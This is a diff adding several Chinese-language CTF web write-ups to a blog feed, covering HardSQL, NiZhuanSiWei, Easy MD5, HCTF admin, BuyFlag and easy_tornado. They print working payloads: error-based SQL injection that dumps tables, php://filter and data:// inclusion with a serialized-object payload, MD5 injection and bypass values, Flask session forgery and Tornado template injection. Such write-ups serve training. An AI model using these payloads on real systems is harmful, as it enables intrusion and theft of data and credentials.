@@ -4,6 +4,158 @@
   
     
     <entry>
+      <title>极客大挑战 2019 HardSQL</title>
+      <link href="/2022/05/28/HardSQL/"/>
+      <url>/2022/05/28/HardSQL/</url>
+      
+        <content type="html"><![CDATA[<p>看题目就是熟悉的SQL注入</p><p>尝试万能密码</p><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528222128869.png"></p><p>尝试联合注入</p><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528222128869.png"></p><p>尝试报错注入</p><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528222245314.png"></p><p>发现注入点在password</p><p>爆出数据库名</p><pre><code>/check.php?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23</code></pre><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528222336896.png"></p><p>爆出表名</p><pre><code>/check.php?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&#39;geek&#39;)))))%23</code></pre><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528222459600.png"></p><p>爆字段</p><pre><code>/check.php?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;)))))%23</code></pre><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528222528162.png"></p><p>爆值</p><pre><code>/check.php?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1))))%23</code></pre><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528222545921.png"></p><p>这只有一半我们利用<code>left(),right()&#125;</code></p><pre class="line-numbers language-pgsql"><code class="language-pgsql">/check.php?username=admin&password=admin%27^extractvalue(1,concat(0x7e,(select(left(password,30))from(H4rDsq1))))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528222950079.png"></p><pre class="line-numbers language-pgsql"><code class="language-pgsql">/check.php?username=admin&password=admin%27^extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528222958839.png"></p><p>这里注意观察中间有重复部分去掉后拼接到一起就是flag</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ZJCTF 2019 NiZhuanSiWei</title>
+      <link href="/2022/05/28/ZJCTF-2019-NiZhuanSiWei/"/>
+      <url>/2022/05/28/ZJCTF-2019-NiZhuanSiWei/</url>
+      
+        <content type="html"><![CDATA[<p>题目源码:</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">"welcome to the zjctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;h1>"</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Not now!"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//useless.php</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显的反序列化题目，需要get传参数<code>text,file,password</code>还需要进行一个绕过</p><p><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))</code></p><p>首先这个text不能为空，在文件中读取字符串为<code>welcome to the zjctf</code></p><p>此时就需要用到data:&#x2F;&#x2F;协议，构造payload</p><pre><code>?text=data://text/plain,welcome to the zjctf</code></pre><p>然后观察有一正则匹配，我们不能直接为flag.php，有一文件包含了<code>useless.php</code>我们利用php:&#x2F;&#x2F;filter协议读取源码</p><pre><code>file=php://filter/read=convert.base64-encode/resource=useless.php</code></pre><p>将二者结合拿到base64编码后的源码</p><pre><code>text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></pre><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528220808966.png"></p><p>在进行解码后</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//flag.php  </span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>              <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>"U R <span class="token constant">SO</span> <span class="token constant">CLOSE</span> <span class="token operator">!</span><span class="token comment" spellcheck="true">///COME ON PLZ");</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接进行反序列化</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//flag.php </span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token string">"flag.php"</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>"U R <span class="token constant">SO</span> <span class="token constant">CLOSE</span> <span class="token operator">!</span><span class="token comment" spellcheck="true">///COME ON PLZ");</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528221026104.png"></p><p>最终我们的payload</p><pre><code>?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; </code></pre><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528221443996.png"></p><p>右键查看源码找到flag</p><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528221516224.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>BJDCTF 2020 Easy MD5</title>
+      <link href="/2022/05/28/Easy_md5/"/>
+      <url>/2022/05/28/Easy_md5/</url>
+      
+        <content type="html"><![CDATA[<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>拿到题目只给了一个登录框，一般就是sql注入，F12没有任何信息，尝试注入语法，没有报错回显继续进行信息收集，看见一个非常关键的信息</p><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528213812713.png"></p><p>这里利用了md5加密，百度查询一下这个的语法</p><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528214154353.png"></p><p>这里raw的值时true，意为返回16字符二进制格式，这里也就是说如果md5值经过hex转成字符串后为 ‘or’+balabala这样的字符串，则拼接后构成的SQL语句为：</p><pre><code>select * from `admin` where password=&#39;&#39;or ___</code></pre><p>木的就是让or后面的值时ture，只要是数字开头都是可以的，password&#x3D;‘xxx’ or 1，返回值是true。</p><p>可通过如下脚本</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$c</span> <span class="token operator">&lt;</span> <span class="token number">1000000</span><span class="token punctuation">;</span> <span class="token variable">$c</span><span class="token operator">++</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'\'or\''</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span>   <span class="token keyword">echo</span> <span class="token string">"\nmd5($i) = "</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string">"."</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提供一常用<code>ffifdyop</code>被加密后raw参数为true<code>&#39;or&#39;6\&lt;trash&gt;</code>后面的&lt;trash&gt;是不可见字符，成功sql注入</p><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>直接F12发现了提示</p><pre><code>$a = $GET[&#39;a&#39;];$b = $_GET[&#39;b&#39;];if($a != $b &amp;&amp; md5($a) == md5($b))&#123;    // wow, glzjin wants a girl friend.</code></pre><p>直接进行md5数组绕过</p><pre><code>?a[]=0&amp;b[]=1</code></pre><p>也可以用下面进行弱等于比较</p><pre><code>a=QNKCDZO&amp;b=s878926199a</code></pre><h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>同样可以进行数组绕过，POST传参数</p><pre><code>param1[]=0&amp;param2[]=1</code></pre><p>也可以直接找md5强碰撞的值</p><pre><code>param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>HCTF 2018 admin</title>
+      <link href="/2022/05/28/HCTF_2018_admin/"/>
+      <url>/2022/05/28/HCTF_2018_admin/</url>
+      
+        <content type="html"><![CDATA[<p>进入题目首先F12查看源码，告诉我们我们不是admin，首先看cookie有没有办法修改，发现什么都没有，点击右上角的login，尝试admin的密码123 直接拿到flag，<del>好本题结束</del>。</p><p>自己注册一个，发现没有特别的，右上角多了</p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528201006578.png" style="zoom:50%;" /><p>检查一下每一个的源码，在<code>change password</code>上看见了一个github的网站</p><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528201128739.png"></p><p>尝试访问，发现是这道题的源码</p><h4 id="法1-flask-session伪造"><a href="#法1-flask-session伪造" class="headerlink" title="法1:flask session伪造"></a>法1:flask session伪造</h4><p>​         flask中session是存储在客户端cookie中的，也就是存储在本地。flask仅仅对数据进行了签名。签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题（百度的）</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> zlib<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> session_json_serializer<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode<span class="token keyword">def</span> <span class="token function">decryption</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token punctuation">,</span> sig <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span>b<span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    payload<span class="token punctuation">,</span> timestamp <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span>b<span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    decompress <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>b<span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        decompress <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not base64 decode the payload because of '</span>                         <span class="token string">'an exception'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> decompress<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            payload <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not zlib decompress the payload before '</span>                             <span class="token string">'decoding the payload'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> session_json_serializer<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>decryption<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我们需要一个SECRET_KEY，在给我们的源码里找发现config.py里</p><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528210917372.png"></p><p>直接给了我们secret_key，接下来我们直接伪造一个name为admin的session</p><p>参考<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html">文章</a> 脚本<a href="https://github.com/noraj/flask-session-cookie-manager">链接</a></p><p>得到后提交得到flag</p><h4 id="法2-Unicode欺骗"><a href="#法2-Unicode欺骗" class="headerlink" title="法2: Unicode欺骗"></a>法2: Unicode欺骗</h4><p>在看源码的时候发现routes.py文件里修改密码时会修改为小写</p><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528212213502.png"></p><p>观察最后</p><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528212304827.png"></p><p>我们注册ᴬᴰᴹᴵᴺ用户，然后在用ᴬᴰᴹᴵᴺ用户登录，因为在login函数里使用了一次nodeprep.prepare函数，因此我们登录上去看到的用户名为ADMIN，此时我们再修改密码，又调用了一次nodeprep.prepare函数将name转换为admin，然后我们就可以改掉admin的密码，最后利用admin账号登录即可拿到flag。</p><p>转换时过程如下ᴬᴰᴹᴵᴺ -&gt; ADMIN -&gt; admin</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>极客大挑战 2019 BuyFlag</title>
+      <link href="/2022/05/28/Buyflag/"/>
+      <url>/2022/05/28/Buyflag/</url>
+      
+        <content type="html"><![CDATA[<p>打开题目看到右上角，点击payflag，这道题，直接告诉我们需要什么条件，按F12 看见一个很明显的提示</p><pre class="line-numbers language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--    ~~~post money and password~~~if (isset($_POST['password'])) {    $password = $_POST['password'];    if (is_numeric($password)) {        echo "password can't be number&lt;/br>";    }elseif ($password == 404) {        echo "Password Right!&lt;/br>";    }}--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>告诉我们我们的<code>password</code>需要是404但是我们要绕过<code>is_numeric</code>，看见弱等于，我们直接另<code>paaword=404a</code>成功绕过，再将money的值为100000000发现</p><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528195846219.png"></p><p>这里有一个验证，提示我们只有cuit’s students可以做这件事，这里一般验证都是在cookie，直接看向我们的cookie果然有一个</p><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528195930419.png"></p><p>将值改为1，刷新网页，又告诉我们我们的长度太长</p><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528200013849.png"></p><p>这里就有两个方式可以绕过</p><h4 id="法1"><a href="#法1" class="headerlink" title="法1:"></a>法1:</h4><p>将money改为数组</p><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528200056841.png"></p><h4 id="法2："><a href="#法2：" class="headerlink" title="法2："></a>法2：</h4><p>用科学记数法</p><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528200131344.png"></p><p>直接得到flag</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Easy_tornado</title>
+      <link href="/2022/05/27/easy_tornado/"/>
+      <url>/2022/05/27/easy_tornado/</url>
+      
+        <content type="html"><![CDATA[<p>拿到题目看见三个网址，分别去访问并观察URL变化</p><h4 id="flag-txt（直接告诉flag的目录名）"><a href="#flag-txt（直接告诉flag的目录名）" class="headerlink" title="flag.txt（直接告诉flag的目录名）"></a>flag.txt（直接告诉flag的目录名）</h4><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220527210238384.png"></p><h3 id="welcome-txt"><a href="#welcome-txt" class="headerlink" title="welcome.txt"></a>welcome.txt</h3><p>渲染？</p><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220527210307999.png"></p><h3 id="hints-txt"><a href="#hints-txt" class="headerlink" title="hints.txt"></a>hints.txt</h3><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220527210324883.png"></p><p>仔细观察URL都是</p><pre><code>file?filename=***&amp;filehash=***</code></pre><p>尝试修改文件名为&#x2F;fllllllllllllag发现报错，并且URL传参数变成了新的</p><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220527210912959.png"></p><p>最重要的一看就是hints.txt告诉了我们后面的<code>filehash</code>的值是将cookie_secret和md5加密后的filename再次md5加密，那么现在我们已经知道了flag的名字为&#x2F;fllllllllllllag</p><p>现在的主要目标就是找到cookie_secret</p><p>想起来题目tornado，查询tornado框架是python的web框架，这个框架可以存在读取配置文件的漏洞，而render就是SSTI服务器模版漏洞。</p><p>尝试修改下方的Error，发现回显跟随改变，一瞬间就想到了SSTI，构造如下payload</p><pre><code>error?msg=&#123;&#123;handler.settings&#125;&#125;</code></pre><p>直接拿到cookie_secret</p><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528001145364.png"></p><p>将&#x2F;fllllllllllllag进行md5加密（3bf9f6cf685a6dd8defadabfb41a03a1）后拼接到cookie_secret后面，再一次md5加密</p><p>即：7d575eba-6f27-446a-aabc-9965814375253bf9f6cf685a6dd8defadabfb41a03a1</p><p>进行md5加密</p><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528001438040.png"></p><p>再进行传参拿到flag</p><p><img src="https://nssctf.wdf.ink/img/xmj/image-20220528001602525.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> SSTI </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ACTF2020 新生赛BackupFile 1</title>
       <link href="/2022/05/14/ACTF2020-BackupFile/"/>
       <url>/2022/05/14/ACTF2020-BackupFile/</url>
